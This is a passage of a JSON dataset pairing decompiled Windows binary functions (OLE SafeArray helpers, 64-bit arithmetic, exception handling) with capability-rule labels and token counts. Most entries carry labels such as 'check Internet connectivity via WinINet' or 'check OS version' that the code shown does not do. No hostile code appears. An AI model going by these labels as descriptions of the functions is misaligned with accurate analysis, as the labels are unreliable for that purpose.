        "token_count": 90
    },
    "0040b804": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b804(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar3 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar3 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        if ((((*arg_10h == 0) && (arg_10h[1] == 0)) && (arg_10h[2] == 0xc0)) && (arg_10h[3] == 0x46000000)) {\ncode_r0x0040b8b4:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar3 = 0;\n        }\n        else {\n            piVar4 = arg_ch[2];\n            while (piVar4 != NULL) {\n                piVar2 = *arg_ch;\n                if ((piVar2 == NULL) ||\n                   (((*piVar2 == *arg_10h && (piVar2[1] == arg_10h[1])) &&\n                    ((piVar2[2] == arg_10h[2] && (piVar2[3] == arg_10h[3])))))) {\n                    if (piVar4 == 0x1) goto code_r0x0040b8b4;\n                    iVar3 = (*piVar4)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((piVar2 != NULL) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n                ppiVar1 = arg_ch + 5;\n                arg_ch = arg_ch + 3;\n                piVar4 = *ppiVar1;\n            }\n            iVar3 = -0x7fffbffe;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 531
    },
    "0040bc89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bc89(int32_t *param_1)\n\n{\n    if (1 < *(*param_1 + -4)) {\n        fcn.00401450(*(*param_1 + -0xc));\n    }\n    return *param_1;\n}\n",
        "token_count": 63
    },
    "0042f84f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042f84f(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0042f825();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "0040c917": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c917(int16_t *plLbound, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t cDims;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    piVar2 = plLbound;\n    if ((*plLbound != 0x2011) || (iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(plLbound + 4)),  iVar3 != 1))\n    {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(piVar2);\n        var_8h = 0;\n        cDims = arg_ch;\n        *piVar2 = 0x2011;\n        iVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(0x11, 1, &cDims);\n        *(piVar2 + 4) = iVar3;\n        if (iVar3 != 0) {\n            return;\n        }\n        fcn.00422e2d();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(piVar2 + 4), 1, &var_4h);\n    fcn.0040c68e(uVar4);\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(piVar2 + 4), 1, &plLbound);\n    fcn.0040c68e(uVar4);\n    iVar3 = plLbound - var_4h;\n    if (iVar3 < 0) {\n        iVar3 = 0;\n    }\n    if (iVar3 == arg_ch) {\n        return;\n    }\n    cDims = arg_ch;\n    var_8h = var_4h;\n    uVar4 = (*_sym.imp.OLEAUT32.dll_SafeArrayAllocDescriptorEx)(*(piVar2 + 4), &cDims);\n    fcn.0040c68e(uVar4);\n    return;\n}\n",
        "token_count": 490
    },
    "0040d018": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040d018(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        fcn.00411850(param_1, 0, 0x18);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "0040d2ff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2ff(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.0040c68e(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 1, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 1, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.00427267(iVar2, 0xffffffff);\n        fcn.00411970(*(arg_8h + 4), var_ch, iVar2);\n    }\n    else {\n        fcn.00427267(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 353
    },
    "0040d893": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d893(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayUnaccessData)(*(in_ECX + 8), &var_ch);\n    fcn.0040c68e(uVar1);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar2 == 1) {\n        (*_sym.imp.OLEAUT32.dll_SafeArrayLock)(*(in_ECX + 8), 0, &var_8h);\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetLBound)(*(in_ECX + 8), 0, &var_4h);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar2 = iVar2 * ((var_4h - var_8h) + 1);\n        fcn.00427267(iVar2, 0xffffffff);\n        fcn.00411970(*(arg_8h + 4), var_ch, iVar2);\n    }\n    else {\n        fcn.00427267(0, 0xffffffff);\n    }\n    (*_sym.imp.OLEAUT32.dll_SafeArrayGetElement)(*(in_ECX + 8));\n    return;\n}\n",
        "token_count": 352
    },
    "0040d956": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d956(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetElemsize)(*(in_ECX + 8));\n    if (iVar1 != 1) {\n        fcn.00422e61();\n    }\n    var_4h = 0;\n    var_8h = arg_8h;\n    fcn.0040cfb2(&var_8h);\n    return;\n}\n",
        "token_count": 137
    },
    "0040d98b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040d98b(uint16_t *param_1, uint32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    \n    if ((param_3 != 0) && (param_4 != 0)) {\n        uVar4 = param_2;\n        if (((param_2 & 0x7000) == 0) && ((uVar4 != 0 && (uVar4 != 1)))) {\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(param_1);\n            iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayDestroy)(param_2, param_3, param_3);\n            *(param_1 + 4) = iVar2;\n            if (iVar2 == 0) {\n                iVar2 = fcn.00422e2d();\n            }\n            *param_1 = uVar4 | 0x2000;\n            *(param_1 + 10) = param_3;\n            uVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(iVar2);\n            *(param_1 + 8) = uVar3;\n            return;\n        }\n    }\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 326
    },
    "0040ded7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ded7(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *in_ECX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if ((in_ECX[2] == 2) || (arg_ch[2] == 2)) {\n        arg_8h[2] = 2;\n    }\n    else {\n        if ((in_ECX[2] != 1) && (arg_ch[2] != 1)) {\n            uVar2 = arg_ch[1] + in_ECX[1] + CARRY4(*arg_ch, *in_ECX);\n            if ((((arg_ch[1] ^ in_ECX[1]) & 0x80000000) == 0) && (((in_ECX[1] ^ uVar2) & 0x80000000) != 0)) {\n                iVar1 = 1;\n            }\n            else {\n                iVar1 = 0;\n            }\n            *arg_8h = *arg_ch + *in_ECX;\n            arg_8h[1] = uVar2;\n            arg_8h[2] = iVar1;\n            return;\n        }\n        arg_8h[2] = 1;\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return;\n}\n",
        "token_count": 317
    },
    "0040df5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df5c(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *in_ECX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if ((in_ECX[2] == 2) || (arg_ch[2] == 2)) {\n        arg_8h[2] = 2;\n    }\n    else {\n        if ((in_ECX[2] != 1) && (arg_ch[2] != 1)) {\n            uVar2 = (in_ECX[1] - arg_ch[1]) - (*in_ECX < *arg_ch);\n            if ((((arg_ch[1] ^ in_ECX[1]) & 0x80000000) == 0) || (((in_ECX[1] ^ uVar2) & 0x80000000) == 0)) {\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = 1;\n            }\n            *arg_8h = *in_ECX - *arg_ch;\n            arg_8h[1] = uVar2;\n            arg_8h[2] = iVar1;\n            return;\n        }\n        arg_8h[2] = 1;\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return;\n}\n",
        "token_count": 316
    },
    "0040dfe1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040dfe1(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *param_1;\n    if (param_1[2] == 0) {\n        iVar2 = param_1[1];\n        iVar3 = 0;\n        if ((iVar1 == 0) && (iVar2 == -0x80000000)) {\n            iVar3 = 1;\n        }\n        param_2[2] = iVar3;\n        *param_2 = -iVar1;\n        param_2[1] = -(iVar2 + (iVar1 != 0));\n    }\n    else {\n        *param_2 = iVar1;\n        param_2[1] = param_1[1];\n        param_2[2] = param_1[2];\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0040e145": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040e145(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    ulong uVar1;\n    \n    if (in_ECX[2] == 0) {\n        if (arg_ch == 0) {\n            *arg_8h = 0;\n            arg_8h[1] = -0x80000000;\n        }\n        else {\n            if (((arg_ch != -1) || (*in_ECX != 0)) || (in_ECX[1] != -0x80000000)) {\n                uVar1 = fcn.00412930(*in_ECX, in_ECX[1], arg_ch, arg_ch >> 0x1f);\n                arg_8h[2] = 0;\n                *arg_8h = uVar1;\n                arg_8h[1] = uVar1 >> 0x20;\n                return arg_8h;\n            }\n            *arg_8h = -1;\n            arg_8h[1] = 0x7fffffff;\n        }\n        arg_8h[2] = 1;\n    }\n    else {\n        *arg_8h = *in_ECX;\n        arg_8h[1] = in_ECX[1];\n        arg_8h[2] = in_ECX[2];\n    }\n    return arg_8h;\n}\n",
        "token_count": 316
    },
    "0040e352": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e352(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_ch;\n    if (arg_ch == 0) {\n        fcn.00422e61();\n    }\n    var_4h = arg_14h;\n    var_8h = iVar1;\n    fcn.0040d98b(arg_8h, 1, &var_8h);\n    if (arg_10h != 0) {\n        fcn.0040cecd(&arg_ch);\n        iVar2 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        fcn.00411970(arg_ch, arg_10h, iVar2 * iVar1);\n        fcn.0040cee3();\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0040efd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pbstr\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040efd6(uint arg_8h, uint pbstrOut, uint dwFlags)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    ulong *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint pbstr;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = 0;\n    if (*(extraout_ECX + 1) == 2) {\n        fcn.00401ce0(0x44da68);\n    }\n    else if (*(extraout_ECX + 1) == 1) {\n        piVar3 = fcn.004290ee();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + 0xc) = iVar4 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        iVar4 = fcn.00401bb0(0xd800);\n        if (iVar4 == 0) {\n            fcn.00401ce0(\"Invalid DateTime\");\n        }\n        else {\n            fcn.004019a0(unaff_EBP + 0xc);\n        }\n        fcn.00401200();\n    }\n    else {\n        *(unaff_EBP + -0x10) = 0;\n        uVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 1;\n        iVar4 = (*_sym.imp.OLEAUT32.dll_VarBstrFromDisp)\n                          (uVar1, *(unaff_EBP + 0x10), *(unaff_EBP + 0xc), unaff_EBP + -0x10, extraout_ECX);\n        if (iVar4 < 0) {\n            piVar3 = fcn.004290ee();\n            iVar4 = (**(*piVar3 + 0xc))();\n            *(unaff_EBP + 0xc) = iVar4 + 0x10;\n            *(unaff_EBP + -4) = 2;\n            iVar4 = fcn.00401bb0(0xd800);\n            if (iVar4 == 0) {\n                fcn.00401ce0(\"Invalid DateTime\");\n            }\n            else {\n                fcn.004019a0(unaff_EBP + 0xc);\n            }\n        }\n        else {\n            fcn.0040eccb(*(unaff_EBP + -0x10));\n            *(unaff_EBP + -4) = 3;\n            fcn.004019a0(unaff_EBP + 0x10);\n        }\n        fcn.00401200();\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x10));\n    }\n    uVar2 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 718
    },
    "0040f4b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0040f4b3(int32_t *param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    \n    if ((param_2 == 0) && (param_3 != NULL)) {\n        uStack12 = 0x80070057;\n        fcn.00401100();\n    }\n    iVar1 = (***param_3)(param_3, 1);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401440();\n    }\n    *param_1 = iVar1 + 0x10;\n    fcn.00401340(param_3);\n    fcn.00411970(*param_1, uStack12, param_3);\n    return param_1;\n}\n",
        "token_count": 186
    },
    "0040f5b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040f5b4(uint32_t *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 < 4) {\n        param_2 = 4;\n    }\n    if (param_3 < 2) {\n        param_3 = 0x40;\n    }\n    param_1[3] = 0;\n    param_1[2] = 0;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    return;\n}\n",
        "token_count": 129
    },
    "0040f60b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f60b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_1[3] == 0) {\n        iVar1 = fcn.00427220(param_1 + 2, param_1[1], *param_1);\n        iVar3 = param_1[1];\n        piVar2 = iVar1 + 4 + *param_1 * (iVar3 + -1);\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = param_1[3];\n                param_1[3] = piVar2;\n                piVar2 = piVar2 - *param_1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    param_1[3] = *param_1[3];\n    return;\n}\n",
        "token_count": 216
    },
    "0040f993": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f993(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n        *(param_1[1] + 0xec) = *param_1;\n        *(param_1[1] + 0xf0) = param_1[2];\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00410a0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00410a0f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_8h, uint arg_ch, uint noname_16, uint noname_17, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc4;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x410aaa;\n        var_34h = 1;\n    }\n    else {\n        pcStack40 = fcn.00410ad6;\n        uStack36 = *0x4640c8;\n        uStack32 = var_20h;\n        puStack28 = var_ch_2;\n        uStack24 = var_1ch;\n        uStack20 = var_18h;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00410a0f::var_28h_2;\n        var_30h = var_8h_3;\n        var_2ch = var_28h;\n        iVar1 = fcn.00414501(*var_8h_3, &fcn.00410a0f::var_30h);\n        (**(iVar1 + 0x74))();\n        var_34h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_34h;\n}\n",
        "token_count": 671
    },
    "00410ad6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00410ad6(int32_t param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7\n                 , uint param_8)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    int32_t arg_20h;\n    int32_t noname_8;\n    code *extraout_var;\n    code *UNRECOVERED_JUMPTABLE;\n    \n    if (*(param_2 + 8) == *0x4640c8) {\n        if ((*(param_1 + 4) & 0x66) == 0) {\n            noname_8 = 1;\n            arg_20h = *(param_2 + 0x18);\n            fcn.00414426(param_1, *(param_2 + 0x10), param_3, 0, *(param_2 + 0xc), *(param_2 + 0x14), arg_20h, 1);\n            UNRECOVERED_JUMPTABLE = extraout_var;\n            if (*(param_2 + 0x24) == 0) {\n                arg_20h = param_2;\n                noname_8 = param_1;\n                fcn.00410932(param_2, param_1);\n            }\n            fcn.00410a0f(0x123, &stack0xfffffff8, 0, 0, 0, 0, 0, arg_20h, noname_8, unaff_EBX, UNRECOVERED_JUMPTABLE, \n                         unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4, param_5, param_6, param_7, \n                         param_8);\n    // WARNING: Could not recover jumptable at 0x00410b80. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return uVar1;\n        }\n        *(param_2 + 0x24) = 1;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) | 8;\n    }\n    return 1;\n}\n",
        "token_count": 524
    },
    "00410b88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410b88(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    var_4h = *(arg_8h + 0xc);\n    iVar2 = *(arg_8h + 0x10);\n    uVar4 = var_4h;\n    arg_8h = var_4h;\n    if (-1 < arg_ch) {\n        do {\n            if (uVar4 == 0xffffffff) {\n                fcn.00414830();\n            }\n            uVar4 = uVar4 - 1;\n            iVar1 = iVar2 + uVar4 * 0x14;\n            if (((*(iVar1 + 4) < arg_10h) && (arg_10h <= *(iVar1 + 8))) || (uVar4 == 0xffffffff)) {\n                arg_ch = arg_ch + -1;\n                var_4h = arg_8h;\n                arg_8h = uVar4;\n            }\n        } while (-1 < arg_ch);\n    }\n    uVar4 = uVar4 + 1;\n    *arg_14h = uVar4;\n    *arg_18h = var_4h;\n    if ((*(iVar3 + 0xc) <= var_4h && var_4h != *(iVar3 + 0xc)) || (var_4h < uVar4)) {\n        fcn.00414830();\n    }\n    return iVar2 + uVar4 * 0x14;\n}\n",
        "token_count": 403
    },
    "00410c4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00410c4b(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    \n    iVar2 = fcn.00414501();\n    if (param_1 == *(iVar2 + 0x88)) {\n        iVar2 = fcn.00414501();\n        *(iVar2 + 0x88) = *(param_1 + 4);\n        return;\n    }\n    iVar2 = fcn.00414501();\n    iVar2 = *(iVar2 + 0x88);\n    do {\n        iVar3 = iVar2;\n        if (*(iVar3 + 4) == 0) {\n            fcn.00412580(0x455f28, 8);\n            pcVar1 = *0x464368;\n            if (*0x464368 != NULL) {\n                *(unaff_EBP + -4) = 0;\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.00412580(0x455f18, 8);\n            iVar2 = fcn.00414501();\n            if (*(iVar2 + 0x6c) != 0) {\n                *(unaff_EBP + -4) = 0;\n                iVar2 = fcn.00414501();\n                (**(iVar2 + 0x6c))();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.004179c6(10);\n            fcn.0041efc5(0x16);\n            fcn.004123d5(3);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = *(iVar3 + 4);\n    } while (param_1 != *(iVar3 + 4));\n    *(iVar3 + 4) = *(param_1 + 4);\n    return;\n}\n",
        "token_count": 440
    },
    "004147e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
